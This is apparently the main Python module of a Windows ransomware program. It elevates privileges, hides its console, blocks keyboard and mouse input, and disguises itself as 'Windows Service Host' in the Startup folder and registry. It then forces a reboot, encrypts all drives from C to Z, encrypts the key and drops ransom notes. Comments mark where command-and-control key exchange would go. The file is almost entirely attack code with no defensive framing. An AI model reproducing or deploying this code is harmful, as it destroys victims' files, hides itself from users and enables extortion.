import os
import sys
import ctypes
from evasion import evador
from utilities import utility
from ransomware import ransomware
from elevate_privileges import elevate_privs
import shutil
import win32api
import win32con
import time
USER_NAME = os.getlogin()
myname = str(sys.argv[0])
FileName = "Windows Service Host" #leave this please :)

class main_program:
    drives = ["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"]
    
    util = utility()
    evad = evador()
    ransom = ransomware(drives)     #All main drives to encrypt (on object creation, all the one's who doesn't exists will be removed from the list)
    
    def __init__(self, hide_console=False):
        self.util.block_input(True)
        self.hide = hide_console        #Should we hide the console? (No when testing)
        if self.util.is_running_as_exe():   #Get current path of executed file
            self.current_path = sys.executable
        else:
            self.current_path = os.path.abspath(__file__)
        
        """Not bypassing yet, only creating the object
        The file we want to elevate privileges is the current path (main)
        """
        self.priv = elevate_privs(self.current_path)
            
    def hide_console(self, should_hide=False):
        """Should we hide the console"""
        
        if should_hide:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def delete_file(self, path):
        """Delete a file from the system"""
        
        if os.path.exists(path) and os.path.isfile(path):
            self.ransom.shred_file(path)

    def decrypt(self):
        #When implementing C&C, replace the self.ransom.private_key with the retrieved private key from the C&C
        #print("Decrypting fernet key")
        self.ransom.decrypt_fernet_key(self.ransom.private_key)
        
        #print("Decrypting the data...")
        self.ransom.restore_system()

    def launch_ransomware(self):
        """Launch the ransomware"""
        self.util.block_input(True)
        #When implementing C&C, this is the part where you send the keys to the C&C, and delete them from the memory here.
        #print("Generating keys...")
        self.ransom.generate_keys()
        self.ransom.generate_fernet()
        
        #print("Encrypting the data...")
        self.ransom.crypt_system()
        
        #When implementing C&C, replace the self.ransom.public_key with the retrieved private key from the C&C
        #print("Encrypting fernet key")
        self.ransom.encrypt_fernet_key(self.ransom.public_key)

        #print("Adding notes to the user")
        self.ransom.add_notes()     #Add the note, explaining the user what it did
        
        #print("Restoring registry")
        self.ransom.restore_registry_keys()     #Restore all the modified registry keys

        

        time.sleep(3)
        self.util.block_input(False)
        filesbackorno = input("Would you like your files back? (Y/N): ")

        if filesbackorno == ("y" or "Y"):
            self.decrypt()
        else:
            print("Fine then, keep your encrypted files!")
    

    def autorunprogram(self):
        if ".py" in myname:
            return
        else:
            try:
                shutil.copy2(myname, fr'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{FileName}.exe' % USER_NAME)
                file_path = myname
                if file_path == "":
                    file_path = os.path.dirname(os.path.realpath(__file__))
                bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
                with open(bat_path + '\\' + f"{FileName}.bat", "w+") as bat_file:
                    bat_file.write(r'start "" %s' % file_path)
                    win32api.SetFileAttributes(f"{FileName}.bat", win32con.FILE_ATTRIBUTE_HIDDEN)
                    bat_file.close()
            except Exception as e:
                print(e)

    def run(self):
        """The function that combines everything"""
        
        if self.priv.get_admin():       #Can we get administrator privileges
            self.hide_console(self.hide)        #Should we hide the console?
            
            #print("Blocked the input from the mouse and keyboard")
            self.util.block_input(True)    #Block the input
            
            #print("Is admin: {}".format(self.priv.is_running_as_admin()))    
            #print("Already executed?")
            
            if self.ransom.already_executed():      #Registry keys already modified
                #print("YES")
                #print("\nBeginning the Ransomware\n")       
                self.autorunprogram()                                  
                self.launch_ransomware()

                    
                self.util.block_input(True)
            else:
                #print("NO")

                #print("Writing to registry and startup folder")
                self.ransom.become_persistent()        #Write ourself to the registry        
                self.util.block_input(True)
                self.ransom.change_boot_state()    #Restart PC




if __name__ == "__main__":
    main_p = main_program()
    main_p.run()